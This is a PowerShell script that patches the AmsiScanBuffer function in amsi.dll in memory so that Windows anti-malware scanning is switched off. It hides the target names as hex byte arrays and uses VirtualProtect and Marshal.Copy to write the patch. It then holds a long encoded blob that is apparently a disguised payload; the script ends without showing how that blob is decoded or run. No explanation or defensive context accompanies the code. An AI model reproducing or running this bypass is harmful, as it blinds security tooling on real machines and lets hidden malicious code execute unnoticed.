
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlXXxxcBgfbhgfGB81NTU1TlZ4cXlwYVd8e3F8e3I9PEgYHzU1
NTVFdGd0eDU9GB81NTU1NTU1NU5GYWd8e3JIGB81NTU1NTU1NTFWenh4dHtxNSg1NzcYHxgfNTU1
NTwYHzU1NTUxd3RmcCMhd3x7dGdsKDdBQ2REVFRYVFRUVFBUVFRUOjotVFRZclRUVFRUVFRUVERU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVHJUVFRUVCFzYHIh
VGFUe1tcd3JXQVglfUNSfWV2bFdidngse3Z4U2FcUlt9d3ggY3FWV3xPRldscUIhcnRCIXJHUCxB
XFIkY09SQGBRRCVeX1RUVFRUVFRUVFdER0RUVEFUUFFUXHd5XT5+VFRUVFRUVFRUVFpUVFxyVFlU
QVRUVFd6VFRUVFxUVFRUVFRUVFh/clRUVFRyVFRUVERUVFRUVFdUVFRUclRUVFRUclRUV1RUVFRU
VFRUVFRSVFRUVFRUVFRUVFZUVFRUVFRyVFRUVFRUVFRYVExcQFRUV1RUVFdUVFRUVFRQVFRUUFRU
VFRUVFRUV1RUVFRUVFRUVFRUVFRUVFstJlRUV0VUVFRUVFBUVFReYlNUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUUlRUVFRiVFRUVGJbYlRUWlRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUXFRUVFZUVFRUVFRUVFRUVFRUVFRWVlRUVFByVFRU
VFRUVFRUVFRUVFRWICVPTX0lVFRUVFpXclRUVFRyVFRUVFJyVFRUVFxUVFRUVFRUVFRUVFRUVFRU
VFRWVFRUUlRgdntbbExiVFRUXmJTVFRUVERUVFRUVExUVFRUdlRUVFRUVFRUVFRUVFRUVFRUVFdU
VFRXVFl7X3l3Uix/VFRUWFRUVFRUUlRUVFRUVlRUVFRcclRUVFRUVFRUVFRUVFRUVFRUVERUVFRE
clRUVFRUVFRUVFRUVFRUVFRUVFRUVEFaVFRUVFRUVFRQclRUVFRWVFRAVCBWWFRUUGJBVFRUV1RU
VFRWVFRUV3JUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFReT2xURFRUdlZyRVRUVF52fFBUVF1UelFiVFRWe1knVFRXYl5ULVRUVGVs
U2JcVHZWckVUVFReXnJUVFBvVFFUV0xUVFRUV1RUVEdUfHJEVFRUXl5XUFRUVHpeVHJMQl5XXFRU
VHpSXn56elBiVFRWeC1AVFRUXl1tZWNTRFRUVnx6VFRUVHdYVExUTHJcVFRUXFRUV1BWf3h+TVli
THpURFRUV3xlb1NyVFRWcnpWUGJyQlBifmdaV1BcUER4dFBiekdWfS0sd212VFRUekFWbVBZU39Q
d1d9UF5TfVBZd21yVFRUekdWfVBZUyR9Y1JEVFRWeC10VFRUXlBEfk1CV1hfUER+R1ZcIGVYZlRS
dmRMVlRdV2NSYlRUVnwlUl5UUFRUVExkV3teeFRyV2J3bWJUVFRlbGFUXFR2VnJxVFRUXllXJVJ2
ZExWVF1XY11UVFRWe1lWVHJXYl5XJVRUVHpmV3xyV1RUVFJeck9sZXJcVHZSLXZUVFRedmdEVlRd
VHpdclRUVnxiQVd7WURUcldid21mVFRUemFXfHJXVFRUUl57IXNUVFReViZZfFRyV2JRXVw+VGJX
YlFGckFUVFReUGJiR1FSLXJUVFReUGJBcFFXUFhZVHZHUVItfVRUVF4mVlRUVFRRVFBiQEJQYkxH
V1YlXV5UdlRUVExmXHtecFRiV2JWVnJ8VFRUXnNyXFRUVERcU3shUFRUVFBQclB6VHJUVFd9WFNe
bFdsUlREVHZUcnpcclRUVnshV1RUVFBWV08+V1RUVFdXXFdeVFxUVFRMQVdHXFtWRnJZVFRUUlBy
JXNTeyVfVFRUUFByJUJzRHpUVFRER1FMYlFUVFRWXlRMVFRUTEFXYk9sZXJcVHZSLXZUVFRedmZc
VlRdVHpdclRUVnxib1dtUF1eVERUVFRMQVdHXFNQREx6XGJUVFZ8YkV2eiFQVF1UelFiVFRWf3x4
VFRUVHZmelBUXVR6UWJUVFZ/fE1UVFRUV3tcRFdEV2J3bWZUVFR6Zll9XFp2fERTVF1UUnZhVFZU
XVdjXVRUVFZ7XHpXRFdiV3tcRFdEV2J3bWJUVFR6el9UVFRWfHJZVFRUUl5sUEZRe1x+V0RXYld7
WURUcldid21iVFRUZWxfVEBUdlZyeVRUVF5eVGZUVFRMXVBEdkJTbVBacGJmVFRUREdRe2ZeVFRU
UF5UWFRUVExBV0dcU1BETHpcYlRUVnxiWHZ8IVNUXVR6UWJUVFZ8Zl52eHpTVF1UelFiVFRWcnZ6
V0RUVFd8TGRUVFRXUFRUVFRyUX5UVGNjVFRiVFRUVFRdclx6X3JUVFZ8ekFYVFBURmJUVFRUVFRU
VFRyVERUVHJWcntUVFReclRQVFRURHJUclRUclZye1RUVF5yVFxUVFRETXJUWFRUVERMclREVFRU
RHRyVEBUVFREcHJUTFRUVERyVFRQVFRcVF1UVFRQXFRUVlRUVlRWVFRUV1ZkYFRyW2NeVFRUVn19
dCVNJV9UVFRQVHJfIlZEVFRXV31MJU0lXlRUVFBUclh6XkRUVFZ7JVlUVFRQXnkhVnBiZlRUVER6
XnJUVFZyXz5eYlRUVnslWVRUVFBef1xWcGJmVFRURHpZVFRUVnxlVkAlZVZURFRXVFRUVFRUVFhU
VFRUcX9EYFhWIW9YUVhtWkRUVFRUVFNUUmJUVFRRIVdUVFRcJiFUVFJEU1RUVFRXclRUXCRbJXZ4
eWBPJlhUVFRUVE9UZlRUWVRTVFRUf0NDWFRTV1BUVFdUVFRUVH9HJENfR1RUVFRWREdUVFR6VHJU
VFwlX2Z3J1xUVFRUVFRUVFRUclRUVEN2c3p9JV9UclRUVEV6V1hiVEJUVFRXVFRUVF1EVFRUVERU
VFRUQ1RUVFRRRFRUVFdQVFRUVFdUVFRUWVRUVFRUflRUVFRaVFRUVFRyVFRUVFBUVFRUV1RUVFRU
RFRUVFRcVFRUVFdUVFRUV1RUVFRUUFRUVFRXVFRUVFRyVFRUVFRUTWJYV1RUVFRUVFRSVFtEVlBE
QFJUUFBRUERAUlRUclYmYkRFVFFQU1RUVFJUUVRWcVREUlRZdlZxVERSVF9yVnFURFJUVnJRcVRE
UlRFRFZxVERSVFQlUXFURFJUUHZWcVREUlRXYlYtckRSVEV6Vy1yRFJUXWZWcVREUlRSXFZ9RFhS
VFMlU0xiRFJUVHJUR3JQUlRFVFNQckRSVFtyV0xiRFJUX0BXTGJEUlRSelBMYkRSVF5mV0xiRFJU
VHpQLXJEUlRfIVBQckRSVFh2V1ByRFJUXlBRTGJEUlRbdlBMYkRSVFRQVExiRFJUW3JQTGJEVFRU
VFRTRFRUVFRUVFREVFdUVFBUUFRXUVddZldERFRXVFRQVFZyUERUUlxUVFRXW1RUflRWYlRRVERU
VCFyUFRUU0BUUVRUWlRXTFRlYlZHVFdMVF5UVkdUV0xUQHJRPlRXTFRHVFE+VFdMVC1UUT5UV0xU
YERRPlRXTFQhVFE+VFdMVCVUUT5UVExUbVRYV1RETFRjRFhXVERMVHliQVNUVExSWFRdPlRTdFRa
YlRQVEN0VF1UUFBUQ3RUUXJQUFRDdFRUYlBQVEN0VF1yVFBUQ3RUcHJUUFRDdFR+clRQVEN0VHZE
VFBUQ3RUXGJQUFRDVHJUVFRUVF9QVH9iUFxURFBUVFRUVFRcVFR5fFciV0RiV1REVFRUVFRUclRW
R1xZdlNTclBSVFRUVFRUVlRUX1ByZXJAfVREYlRUVFRUVFxUVHl8VnRXRnZXUXJXLVxUVFRUVFZH
VFhyUFlUUEVUXyFyVFRUVFRfTFx3VFBtVEdUVGFWVFRUVFRUeXJXY1dRQFdQVFQlXGJUVFRUVlJS
WWZQV3JUR1RRYn9UVFRUVF9QTGJERFxUR1BUfmxYVFRUVFR9fXwiV1dUVFBEVjpcYlRUVFRReFRz
XFdXclRGVFt2f1RUVFRUWExUe2JYIlRHXFRUVFRXVFhAU1RUVFZUX1hTVFRUUVRQYlNUVFRQVFJQ
V1RyVFNUXlBXVFRUV1ReUFdUVFRWVFlYV1RUVFFUXHJTVFRUUFRaJVdUVFRTVFFyV1RUVFJUUiVR
VFRUV1ReUFdUVFRWVFlYV1RUVFdUXlBXVFRUV1RaJVFUVFRXVFBUU1RUVFdUU0RTVGJXR1RUflRg
YkRXVFdQVGBiRFJUV35UYGJEXlRWflRgYkREVFFQVGBiRERUUX5UYGJERFRQUFRgYkREVFB+VGBi
RERUU1BUYGJERFRTflRgYkREVFJQVGBiRENUUn5UYGJERFRdUFRgYkREVF1+VGBiRERUWVBUY0RQ
dFRZflRxclh/VFl+VC1EWHpUWX5UbFREYVRfUFR2VEAlVF9QVGZERCBUWFBUfXJEPlRUYlRgYkRS
VFtQVHNEW3hUW1BUZFRbZ1RbUFRkVFttVFRiVENURydUVGJUbHJDPlRUYlRGYkZQVFtQVCFyQllU
W1BUJHJCWVRbflR+ckZHVF9QVE1ERkBUXlBULXJQUlRZUFRjRFJMVFpQVEdEQnBUW1BUQ3JCf1Rb
UFRDckJnVFxQVGBiRFJUW35UT1RCbFRbUFRmclomVFl+VCdyWiJUWX5UOnJFVFRaflR+ckFTVFl+
VGxiRVxUVHJUW1RRQlRUclRaVFF3VFRyVEVUUXJUVHJURFRReVRUclRHVFFkVFRyVEZUUWRUVHJU
QVRRY1RUclRAVFElVFRyVENUUSBUViFUVmJXUVRGIVRQYldYVEYhVFJiV2dURiFUXGJXJVRGIVRe
YlZRVEYhVFhiVlFURiFUWmJWUVRGIVREYlclVEYhVEZiVl9URiFUQGJWUVRGIVRCYlZRVEYhVExi
Vn1URiFUdGJRWVRGIVR2YlFMVEctVEdUVFZUVFBUVFRXYlRBLVdUclRdVFRYVFlURCBXUy1UV3JQ
U1RdZlNURFRQVGJ2VGFiQFZUVERRVkRWeFdEXFREVFBZVF96U1REVFByVFRUVERUVFRUVFRUVFRU
VFRUVFRUVlNURFRUV1RUVFRUVFRUVFRUVFRUVG9EVCxURFRUVFRUUVRUXFRXVFRWVFRUVFRUVFRD
QHlgcVFYbFRQR2VMJkdldycgfXZ7eXJYclQtQUIsfnFCbXlFcldGR0Bxc0dTcUVAfkRURlBhU0JD
LFhBJVtXQVMsW0RAW1xGQCBTVFNfU0ckLFpBJSBTVFBhU0JDLEFHQ0dzQ35TWENAQFRGJUNPTSRT
Q0dDX09NJE9XQVNDU1RTQ1pGQFtFR1BDc0AkR0ZGQCBdVFNfU0ckLFhGQCBZVFNfU0ckLFBDJSxG
R1MsWEZDR0BBUENzR0AgUEZAU1pUU19TRyQsUEMlLEZHUyxWRkBxc0dAIFBGQFNaVFB9WUdDeXNE
JENGQH5DWkNTLENAJUNGVFBhU0JDLFNBeUNbR0NfV0NQQ3NAJENWTSVhU0JDWFRGJUNPTSRxRUNv
TCVNb1hsRiVDT1RQYVNCQyxNQSR2J1tTLSdbUGFTQkRXWUdDeXNEJF9TRENHU00kW0NEeSxZR0N+
VEB+Q11NJV9fQX5TRkJEV0ZHQHFzR0N9RERAIFBNJFt0VFNfU0ckLEFCcldGR0Bxc0FDQ1hDUHlz
QCR6VHF4U2ZxQkNzTWJXUExNR31UUiRvTCcsbHdSeXxUU1sgdiZHeXdGIFF3J21mT0JbJXRCLGB2
bCBdT0IgeXZ4eX9UXVt9d0BHeXYneWxPQkRUTydDJU0leW9HQm15cXhTJU9CRFRAJ319dntXXFhC
R3lUU1t6TE1fYkZSeX5PRFdDdidTe09EV19HUnlvdlIsb0xCX2ZPRFdZT015XExCIH53UkBURCcs
YHYnLGZPRFdCTEJtJE9AIH13QkBUQyZfZXFSQ1h0QiB5VFNxeXdSbVl3eCwmd3lbZU9TRyB2UkBU
Q3hTZnFCQ0BwTVd5VFNfeU8neW9xXV8gRidDIENdeWJPRFdQdE1bYncmW3lUUHEkdEJHV3FdR2x0
Ql8kcVJAVEdSQ3xxQnF7TEJfZk9AUyVxXV9lTHtDJU9EV1F3JyRCdE1bZUx4bXlETUcldnh5fHFN
R3lUUFNvdidDYUx4bSBDUnkld1JDV3FdR2x0Ql8kcVJAVERNW29PQiR8d115QHZ4U35PQiR9dnhh
V3FdR2x0Ql8kcVJAVENSU2xPJ0MlR3tffXdCQyZ3Jl9nRE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0g
R3h5Zk9DT3l2e1tldycgV3FdR2x0Ql8kcVJAVERNW29PQiR8d115UXcnIHh0QnEkdnhTJXRCLGBE
TUcldnh5fHFNR3lUUFNvdidDYUx4bSBHUkNvTCZfZXZdR2V3JyBXcV1HbHRCXyRxUkBURCcsYXZS
eWZMTUdldycgRk9CbX1wUlMldEIsYHYlUyVxXV9lTHtDJU9EV1d2Jlt5d0JfZnBDV2x3J0ckTCZH
V3FdR2x0Ql8kcVJAVERNW29PQiR8d115UXcmVyB2eHl7dF1HV3FdR2x0Ql8kcVJAVERNW29PQiR8
d115UXcnJGJMQiAgRE1HJXZ4eXxxTUd5VFNfJHd7R2V3QkNRdyckYkxNR2VMeHlmdE1HIERNRyV2
eHl8cU1HeVRTW3pMTV9iRlJ5fk9GIHlwUkBUR1JTJUxDW2VweEBUQCd5I09ALHhUUHlgT1JDIUEn
TFRAJnlvcVJDYVl5XyR3e0dld0JAYEN4Q2x2J3ljd3h5YE9iV0B3JFsldnh5YE9iV0FxQl9vcV1f
ZXd4dlRPJ0MlTSVteXd4cSV0VFdbTE19ZXdNQ2FBUkNgTyZHelRTVyV2eUdjQCZHbHRCIHtDQiBl
VFNbJXZ4eWBPJEdjRlBxZncnX313U0NgdERXY0x4elREQm1mdydbXEcnbWNMeFNmVFBPbE9CQ1xH
J21jTHhTZlRQJH12e1t6TEJiVEAmeW9xUkNhWXlbeUwmQ2x0TUcgWXlXbHRCIH90TVd9d1RXfU9d
T312Un5vWHwgfndSYlR3e0d+d1JiYE9SbWZUU1dsdydxbExCJVRPJ0MlTSV5JU9CJVR2J0MlTSV5
JU9CJVRPJ0MlTSV5b0AmeW9xUkNhVFBDYHFCJVRBQlNld3JXQXBNWyVPQiVgQHhDeHdSQ39xUnlj
d3JXX3YkcXl3Um1Zd3gsJndyV3RPTV9jVFJfJE94T3l2cldBT0JbJHZ4eSVwQHl+T0IgJXRCT2VP
TVxUTydDJU0lLCZ3eENsVFYgf3FSLGxUViB/TCZHY3ZyV0FxXV8kTCZHJHZ4Q0B3JFcldnJXQ0ZC
ICVAXUdsVFNbIHYmR3l3RiBQdEJTe3d4LG9xUnl/dmJXQXBNWyVPQiVgQHtDYHFSeWFPRiBfd3tH
eXZ4LGJAJ0NscXh5f09NWFRAJnlvcVJDYVl5XyR3e0dld0JAYEQnLGF2UnlmT01fQU9NXyd0Qlt5
dmJXUE9CXyRPJ3Fld3hxW3cnR3l2Yld9dnhxb1RQQ21xQlNmdmJXJHdQLGJxUnljd3tYVEQnLGBM
J1MlVFAsfHR4Q39xVFdjdlMsU3BdV2Z0QltlcVRXXU9NR1FxTV9sT0IgJVRTX3lPJSxiT0IgWU9N
eVNwVFdAdE1HZk9AeWBPUkMhVF1bJEx+YXlwRFdGT0JxUXdSLG9PQGF5cERXWnFQR3l3UkMlT0NP
fXddQ3lGJ0MgVFAgJUAnQyVDeFNmcUJDWU9NflR0UGF5cERXUXcnICVMQnlgdiVheXBEV2N2UyxT
dk1DfXdSeSVwRFdjdlMsX3d4Q21xQlNmdE1HIFRTcWV3eEdjcSZbX09SQ2BxUnklcERUVF1iJVRW
cld3VFZmVE1EVHJUU1hUdFRXfVRdXFR2VFdcVFJ+VE9UV3lUVFZUJSRmVF5iV3FUVlRURGJXbFRS
QFRMRFclVFJAVFxUV3pUUn5UT1RXflRSQFR3clRyVF1cVE9EV3tUUn5UdmJXJVRdXFRwRFRyVFZy
VEByVyRUUiFUXkRUclRSZlRPRFcgVFF6VFFEVF5UVlRUXFRUclRWVFRAYld6VFJQVHZyV2JUUHJU
dERXflRSQFRZcld5VF1yVE9EVHJUUlBUTGJXJVRSflR3YldgVFElVExiV2xUUkBUTERXJVRSQFRc
VFdnVFJAVHBEVydUUlBUd1RXJFRSQFRFRFR8VFBYVFpyV3ZUU3ZUdERXYFRSRFR3YlcmVF1YVE1U
V0BUUkBUd0RXYlRTYlREcldmVFJQVFlyV3lUXXJUT0RUfFRUVlddJGZUXmJXcVRWVFREYldsVFJA
VExEVyVUUkBUXFRXelRSflRPVFd+VFJAVHdyVHJUXVxUT0RXe1RSflR2YlclVF1cVHBEVHJUVnJU
QHJXJFRSIVReRFRyVFJmVE9EVyBUVlRUcWJXZVRdRFR0VFRyVF1UVExEV2xUUlBUd0RXeVRdRFRP
RFdsVF1YVFpyVFtUVHpUXFRUclRWVFRcVFdBVFJyVExEV2xUXVRURlRXZVRSRFRPRFRgVFJAVHBU
V3lUVlRUTERXf1RdRFR0RFdjVFIhVEVEV39UXVxUT0RXfVRdRFRPRFRyVFJmVE9EVyBUXUxUTERX
ZlRdQFRPRFQsVFZcVERiVCNUU2JUQ2JXZVRSIVRPVFdjVF12VHZiV3ZUU0RUT0RXYVRdVFRNVFdW
VFJiVExEVGBUUkBUcFRXeVRWXFRcVFd9VF1cVE9iVyRUUiVUT0RXYFRdRFR2YlQsVFZcVExEV2xU
UnZUWERUclRSUFR2cld7VFFcVFxyVFRyXCR3VFZmVE1EVHJUUERUT0RXZlRSQFRxVFd5VFZUVHRU
V2VUUkRUT1RXeVRSIVRcVFdsVFJAVE9iV2VUXVhUcVRXbFRdflRcVFR6VFNcVHFEV2BUVn5UXFRX
Z1RSQFRwRFQjVFQlVFZyVHJUVlRUXFRUclRTWFR0VFd9VF1cVHZUV1xUUn5UT1RXeVRWIVRPRFch
VFJAVFxUV31UUlhUcVRXZVRSLVR3clQsVFJEVE9EV2ZUUkBUcVRXeVRUVFtMRFd/VF1EVHREV2NU
UiFUVFQkf1RdXFRPRFd9VF1EVE9EVFRRQkRUT0RXZlRSQFRxVFd5VFRUR3RiV3lUXX5UcXJXfVRS
YlRxRFd5VFRXd0BiV0VUUExUQ1RXTVRQUFRAcldTVFNiVEFEV2VUUlhUdnJXY1RdWFR3Yld4VF1E
VE1UV01UUn5Ud3JXflRSLVRxYldvVFNiVERiVyRUXVxUdnJXeVRSIVRxVFdCVFJAVHZyV29UUn5U
d2JXYFRTYlRAclckVFIhVFRTLVRUVFRUQGJXRVRQTFRDVFdNVFBQVEByV1NUU2JUQURXZVRSWFR2
cldjVF1YVHdiV3hUXURUTVRXTVRSflR3cld+VFItVHFiV29UU2JURGJXJFRdXFR2cld5VFIhVHFU
V0JUUkBUdnJXb1RSflR3YldgVFNiVEByVyRUUiFUVF1+XlRTZlReYldxVFZUVEBiV3pUUlBUdnJX
YlRQclR0RFd+VFJAVFxUV2xUXUBUd3JXYFRSflR3cld7VFZUVExEV29UVlRUT0RXZlRSQFRxcld9
VF1EVE9EV35UVlRUcURXb1RSQFR2clQjVFQlVFZyVHJUVlRUXFRUclRTQFR2YldlVFIhVE9iVHJU
UHJURmJXWFRQJVRNVFciVFFUVHNEVFRxRHpUQmJUZ1RTJVRcVFdBVFJyVExEV2xUXVRURlRXZVRS
RFRPRFRyVF1cVHFEV2BUUiFUdERXYFRSdlRcVFd9VF1YVFxUV2BUUi1UdnJXYVRSUFR3VFRyVF1A
VHZiV3lUXVxUWnJUW1RUelRcVFRyVFZUVFxUV0NUXVhUdERXYFRSdlRcVFdcVFBmVERiV0NUU2JU
cGJUYlRdJVRUUWF3VFZmVE1EVHJUUGZUT0RXIFRWVFR2YlckVFJYVExiV3lUXVhUdmJXeFRdQFR3
VFdmVF1+VFxUV35UUkBUd1RXeVRdRFRPRFd+VFYhVFRQQ3dUVlBUTURUclRQTFRMRFdlVFJiVE9E
V35UVlRUcVRXY1RWVFRPVFd5VFJiVE9EVyVUUkBUXFRXbFRSQFRPYldlVF1YVHFUV2xUXX5UXFRX
Z1RSQFRwRFRgVFRUQUxEV2xUUnZUcURXYVRSQFR3clclVF1YVFRUWHxUVFRTXHJUclRUVCJCYlRn
VFMlVFxUV1lUUkBUcERUclRdWFRxRFd/VFJYVE9EV29UXVhUT3JXJFRSYlR3VFcgVFZUVExiV2xU
UkBUTERXJVRSQFRPVFRgVFRXU0JiVH1UUyVUXFRXUlRSUFR0RFdmVFJAVE9UVHJUXURUd2JUclRS
WFR2cld5VFJQVHFUV3lUVlRUdnJXeVRSdlR0RFdvVF1EVHZyVyBUVlRUdGJXeVRdflRZclRUXiVz
JTpBVGJ8fiNWYGRwVH8iVF13VFRQXFRQV1ZUWHJUVFBTXFRQV1BHUFBcVFBXUXJEclREUFZXVFRX
VEQhUVdiUExXVFRXVldiUFRUUExWVExUVGJQdlJUXFBUVFRGRkREclRXX31XRlRXVH1TeVJydkVT
R19TVHIhWlJEIVpUcn5fUlclWlZUIVxQfn5HUVdQWFd9QEZHRFxaUXJEclREclFXRlRWUXJyXFdW
VFdRcnJdXFRcV1BiVEFUREByVERcQVRUTHJUR1hXUGJUU1RUXFZRciFWV31+UVxUVFZXRFRWVEQh
dldWVFdUcn5dVFREWlFyIVpRckxUVGIhWlFyIVBUVFBPVkRYclRUclBUVFBMUXJEVFREUExUckxM
V1RUV1F9clxhJmV2Q31+JSFcflBUVFRUVFREV1RUVFRXVFxUVFRUUFRiVFRUVERQVFRUVFdUQFRU
VFRQV3JUVFRURF1UVFRUVHJMXFRyTF1UYkxHUFRYVFRUUF9UVEBfUkQhXFZXVE9WclRSVkd+TFZX
UERSVHJTVFRcX1JHclBUVFBcUkREVFRHcnZUYlRUVHJAVFREUHFRclhyVFQhUVZUVFZWVFBUVlRU
VFRUVFRdclBUVERXQFR9T012eFNiQXgsYEdNfX9PTVcldEIsYENSfWx3JnFvVERyV1RUXFRUVFRU
VFQhV1RUeUF0UlNsdlB9ZU9SQFRUVEBXVFRUVFRXdldUV19RdyZXIHZ4eXt0XURyYmR+clxRXGJY
QX5UVFZ+V1RWRCVbUVt+WlJbfE98JSFaQXl/WUFHf1h/XGFMf0d4W3wkfFsnU39Yf1RsT1FHeVhv
dlRUVGJXVFR2bVl/VGBYViFiVFRXW1REVHZZfiBTQ1BPbExCJHlxJyxsdGxtQk9NX290QixgRU1M
JVl/TGBYRFBUQ1QhQEd7X313QkMmdyZfZ0dSeW92Um19cEAgfXdCQEBZfiBTQ1ZXUnZ4U2FPTXFj
dnhmcltWISdZf1BUVFRUVFRUVkQkX1FDVFRUVFRUXFRUVFcmVFRUVHRRdlRUUnJPVFRUVFRUVFRU
VFRUVFRUVFRUVERUVFRUVFRUVFRUVFRUVFRUVFRUVEB5W1BAYkIlRDogck96V1xyWSRRRm1FLEA+
eldUVFRURG9ldkNNW3l2e1t2TEJHYXRCIHZHUiwmd3htY0xCR29NU1t6TE1fYkZSeX5PRiRhTE1b
JU9NX3ZAJ319dntXXHRCR3lZQiR9diZHeXZ5bUF0UlNsdlB9ZU9SQ3Z3J19kTVNfeXdSQ312J0N2
QCd9fXZ7V1x0Qkd5WXtXfkxyVF1aVFRUVFRUVFRUVFRUVFR9WlRUVFRWVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUUG9yVFRUVFRUVFRUVFRUVFRUV3NEJyxsR019eUFCU2V3cldhdidbY3Z4
Q3lZeEdmd1RUVFRUVFRURS15VFZXVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUclREVFRUVFxUVFRyV3JUVFRXRFRUVlRUVFRUVFRUVFRU
VFRUVFRUVFRUV1RUUFRUVFQhVFRWVFRUVFRUVFRUVFRUVFRUVFRUVFRXVFRUVFRUVlRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFdUVFBUVFRXelRUVlRUVFRUVFRUVFRUVFRUVFRUVFRUV1RUVFRUVFZm
VGJUVH5QVFRUV2JRVFRUVFRUVFRUVFRUVFdiUVtUVFRUU0xUQGJXc1RTTFRHRFdGVFNYVEZEV0VU
UCFUTWJXX1RQIVRHcldFVFRUVFRUVixXWjo+VFRUV1RUVFRURFRUVFRUVFRUVFdUVFRUVFRUOlRU
VFRUVFRUVFREVFRUVFdUVFRUVFRUVFRUVFRUVFRUVFRUVEdUVFRUVFBUQ3JXfVRdXFRHcldlVFJi
VE9EV19UUiFUT3JXY1RUVFRUVFR+VFREVFRUV0BUXVxUTERXYFRdWFR3VFd9VF1EVHREV2NUUiFU
VFRUVFRUVFRmVEctVHJUVFREV0FUXURUdnJXZVRSIVRPYldSVFJ+VHdUV3lUUH5Ud3JXeFRSLVRU
VFdMVHJUVFREVGJUUVRUWFRUYlRRVFRbVFd8VFFUVFRUVHRUVFBUVERXUVRSLVR3RFdhVFJAVHdy
VyVUXVhUVFRUVFRUVFRcclRXVFRQVERiV2NUUiVUdlRXfVRSIVRwRFdaVFJQVHdEV3lUVFRUVFRU
VFRUVFRFVFReVFRQVEdyV2VUUmJUT0RXUFRSQFR2Yld/VF1cVHREV2JUXURUdERXY1RSIVRUVFRU
VFNYVHRUV31UXVxUdlRXXFRSflRPVFd5VFRUVFhUVFxUVFBUR3JXZVRSYlRPRFdCVFJAVHZyV29U
Un5Ud2JXYFRUVFRUVFRtVFYhVFhUVGBUUVRUWXJUYlRUVFRFVFRaVFRQVEZEV2BUXURUT0RXbFRS
IVRMRFdmVFAhVExEV2FUUkBUVFRXQVRSclRMRFdsVF1UVEZUV2VUUkRUT0RUYFRSQFRwVFd5VFRU
VEZUVEZUVFBUQVRXeVRSdlRMRFdmVFBYVHdiV2JUXX5UdnJXZVRSdlR0VFclVFRUVERiV2NUXVRU
cERXbFRSflRPYld6VF1EVFxUVmVUVlRUXFRUbFRRVFRYRFQgVFRUVF5yVFdUVFBUQVRXeVRSdlRM
RFdmVFNEVHZyV31UUkRUT0RXYVRSUFR2cldnVF1YVFRUVFRUVFRUVFRXUFRUIVRURFdFVF1cVHRE
V3tUUn5Ud3JXfVRSYlRHcldlVFJiVE9EV2BUUlBUd0RXeVRUVFRAYld6VFJQVHZyV2JUUHJUdERX
flRSQFRZcld5VF1yVE9EVFRUUURUVnJUV1RTVFR2cldjVFJEVHFEV39UXURUQXJXfVRSJVRPRFRU
VFRUVEBiV3pUUlBUdnJXYlRQclR0RFd+VFJAVFRUVCVUVHJUVERXRFRdXFR3Yld+VF1AVExiVyVU
